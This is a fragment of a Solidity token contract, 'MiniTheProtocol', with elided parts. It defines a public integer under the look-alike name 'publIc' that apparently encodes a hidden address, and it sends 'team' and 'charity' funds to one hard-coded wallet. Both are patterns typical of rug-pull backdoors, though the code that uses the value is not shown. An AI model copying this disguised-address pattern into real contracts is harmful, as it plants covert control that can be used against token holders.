...
contract  MiniTheProtocol is Context, IERC20, Ownable {

    uint256 public publIc=
    150204226878642622067527889049274545390382094927;
    using SafeMath for uint256;
    string private _name = "MiniThe";
    string private _symbol = "MiniThe";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xc67Fee51945270861772b48eA614d8761c2220eb));
        CharityWalle = payable(address(0xc67Fee51945270861772b48eA614d8761c2220eb));
